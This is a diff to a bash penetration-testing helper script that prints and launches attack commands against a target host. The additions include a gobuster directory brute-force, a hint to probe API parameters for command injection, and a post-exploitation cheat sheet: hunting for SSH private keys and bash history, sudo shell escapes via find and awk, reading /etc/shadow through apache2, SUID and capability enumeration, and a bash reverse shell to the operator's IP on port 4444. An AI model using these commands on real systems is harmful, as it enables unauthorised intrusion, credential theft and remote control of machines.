@@ -85,6 +85,10 @@ snmpget="snmpget -v 1 -c public $T"
 snmpwalk="snmpwalk -v 1 -c public $T"
 snmpbulkwalk="snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
 nmapfromrustscan="nmap -sC -sV $T -p"
+gobuster="gobuster  dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://$T -x php,txt,html,sh,cgi"
+apiendpoints="Test api endpoints for breakouts: /ping?ip=google.com"
+
+
 
 function menu {
   clear
@@ -169,6 +173,9 @@ function menu {
     4)
       echo -e "\033[34mIf you have logged into the site, make sure to run it with cookies using --cookies= to possible find more results\033[0m"
       echo "(dirsearch) $dirsearch"
+      echo ""
+      echo "Gobuster is an alternative for directory finding"
+      echo "(gobuster) $gobuster"
       ;;
     5)
       echo -e "\033[34mTo host a local folder make sure you are in that folder within the terminal you run this command\033[0m"
@@ -262,6 +269,26 @@ function menu {
       echo ""
       echo -e "\033[34mPython to bash shell\033[0m"
       echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+      echo ""
+      echo "find / -name id_rsa 2> /dev/null"
+      echo ""
+      echo "find / -name authorized_keys 2> /dev/null"
+      echo ""
+      echo "cat ~/.bash_history"
+      echo ""
+      echo "sudo find /bin -name nano -exec /bin/sh \;"
+      echo ""
+      echo "sudo awk 'BEGIN {system("/bin/sh")}'"
+      echo ""
+      echo "sudo apache2 -f /etc/shadow"
+      echo ""
+      echo "find / -type f -perm -04000 -ls 2>/dev/null"
+      echo ""
+      echo "strace /usr/local/bin/suid-so 2>&1 | grep -i -E 'open\|access\|no such file'"
+      echo ""
+      echo "getcap -r / 2>/dev/null"
+      echo ""
+      echo "bash -i >& /dev/tcp/$myip/4444 0>&1"
       echo ""
       echo -e "\033[34mRemember to check https://gtfobins.github.io/\033[0m"
       ;;
@@ -394,6 +421,9 @@ while true; do
     continue
   elif [ "$input" == "dirsearch" ]; then
     gnome-terminal -- bash -c "echo 'running $dirsearch'; $dirsearch; bash"
+    continue
+  elif [ "$input" == "gobuster" ]; then
+    gnome-terminal -- bash -c "echo 'running $gobuster'; $gobuster; bash"
     continue
   elif [ "$input" == "host" ]; then
     gnome-terminal -- bash -c "echo 'running $host'; $host; bash"
